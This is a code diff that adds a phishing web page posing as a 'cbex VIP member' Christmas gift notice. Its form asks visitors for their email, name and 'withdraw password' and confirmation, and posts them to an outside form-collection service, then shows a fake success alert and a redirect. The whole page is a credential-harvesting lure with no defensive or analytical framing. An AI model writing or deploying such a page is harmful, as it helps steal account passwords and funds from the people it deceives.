@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="update.css">
+  <title></title>
+</head>
+
+<body>
+  
+  <div class="cong">
+    <h2>Congratulation</h2>you have been select as a cbex VIP member, you also will be winning a christmas and new year gift within $50 to $1000, kindly update your profile to continue
+  </div>
+  
+  <form id="myForm" onsubmit="submitForm(event)" action="https://formspree.io/f/mldekyqd" method="POST">
+
+  <input class="mail" name="email" type="text" placeholder="Please enter your email address">
+  <input class="pwd" name="message" type="text" placeholder="Please enter your name">
+  <input class="mail" name="email" type="text" placeholder="Please enter your withdraw password">
+<input class="pwd" name="message" type="text" placeholder="Confirm your withdraw password">
+
+
+
+  <button type="submit" class="loginbtn">
+    Update
+  </button>
+</form>
+
+    <script>
+        function submitForm(event) {
+          event.preventDefault(); // prevent default form submission
+          // submit form data to server using AJAX or fetch API
+          // ...
+          alert('Update sucessfull');
+          window.location.href = "(cbex.cx)"; // redirect to thank-you page
+        }
+      </script>
+
+
+</body>
+
+</html>
